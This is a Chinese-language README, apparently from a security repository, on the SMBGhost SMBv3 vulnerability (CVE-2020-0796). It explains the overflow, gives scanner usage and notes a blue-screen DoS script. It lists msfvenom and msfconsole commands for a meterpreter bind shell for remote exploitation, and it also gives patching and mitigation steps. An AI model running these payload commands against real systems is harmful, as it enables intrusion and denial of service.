# SMBGhost

## 原理

漏洞发生在srv2.sys中,由于SMB没有正确处理压缩的数据包,在解压数据包的时候使用客户端传过来的长度进行解压时,并没有检查长度是否合法.最终导致整数溢出。

SMB运行在TCP端口445上，它是一种被广泛利用的网络协议，支持文件共享、网络浏览、打印服务和网络进程间的通信。

## Usage

	python3 scanner.py <IP>

OR

	nmap --script CVE-2020-0796.nse <IP>


CVE-2020-0796-Blue screen.rar 为 SMBGhost Ddos win10蓝屏的python代码。

解压后需要
	
	pip install ntlm-auth
	
	pip -r install requirements-test.txt


## LPE

用 ```winver```命令查看windows版本号，经测试，打过 kb4551762 补丁后，2个poc仍然测试存在漏洞，poc是不准确的。

用 CVE-2020-0796-master.zip 测试，VS编译，卸载补丁包后，成功本地提权。

![](2.PNG)

原理为 直接shellcode注入，注入winlogon.exe进程

## RPE (20200602)

https://github.com/chompie1337/SMBGhost_RCE_PoC

制作payload:

	msfvenom -p windows/x64/meterpreter/bind_tcp lhost=192.168.255.153 lport=4444 -f py -o payload.py

msfconsole

use exploit/multi/handler

set payload windows/x64/meterpreter/bind_tcp

## 影响版本

影响到Windows 10的1903和1909版本，以及Windows Server的1903和1909版本。

![](1.jpg)


## 修复方式

1.[微软补丁](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0796)


2.使用以下PowerShell命令禁用SMBv3服务的压缩（无需重新启动）

```
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" DisableCompression -Type DWORD -Value 1 -Force
```

3.还可以通过禁止SMB的流量流向外网来防御攻击

## 参考资料

[360 核心安全技术团队的原理分析](http://blogs.360.cn/post/CVE-2020-0796.html)

[powershell 检测](https://mp.weixin.qq.com/s?__biz=MzI2OTMzNjg4OQ==&mid=2247485291&idx=1&sn=462ca6f249ead1be35609977e1b2fbe3&chksm=eae0af3ddd97262bbfa000221fd93d53aa931fca2a0cf8bbd6a56c25e66296dbb33c89a1a2dd&mpshare=1&scene=1&srcid=&sharer_sharetime=1584063318697&sharer_shareid=5a0049ad005b04d2683ee755107dbbd6#rd)


[微软smb协议文件](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/1d435f21-9a21-4f4c-828e-624a176cf2a0)

![](3.png)